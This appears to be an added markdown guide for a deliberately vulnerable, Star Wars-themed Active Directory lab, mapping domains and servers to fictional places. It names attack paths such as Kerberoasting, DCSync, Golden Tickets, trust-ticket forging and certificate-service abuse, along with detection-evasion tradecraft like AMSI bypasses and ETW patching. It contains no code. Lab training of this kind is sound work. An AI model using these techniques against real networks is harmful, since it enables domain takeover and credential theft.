+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
